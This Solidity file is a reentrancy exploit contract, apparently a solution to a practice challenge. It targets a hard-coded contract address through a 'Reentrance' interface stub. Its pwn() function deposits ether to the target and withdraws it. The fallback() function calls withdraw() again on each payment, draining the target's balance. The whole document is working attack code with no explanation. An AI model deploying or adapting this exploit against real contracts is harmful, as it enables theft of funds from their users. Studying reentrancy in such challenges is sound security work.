// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrance {
    function withdraw(uint256 _amount) public {}

    function balanceOf(address _who) public view returns (uint256 balance) {}
}

contract payload {
    uint256 value;
    address payable target = 0x37Ca3e828cc2Fb51244119c65aF1269209e7f69B;

    function pwn() public payable {
        bytes memory payload1 = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool success, bytes memory returnData) = address(target).call{
            value: msg.value,
            gas: 400000
        }(payload1);
        value = msg.value;
        Reentrance(target).withdraw(msg.value);
    }

    function balanceOfContract() public view returns (uint256 balance) {
        return Reentrance(target).balanceOf(address(this));
    }

    function WithdrawOfContract() public payable returns (uint256 balance) {
        Reentrance(target).withdraw(1);
        return 0;
    }

    fallback() external payable {
        Reentrance(target).withdraw(value);
    }
}
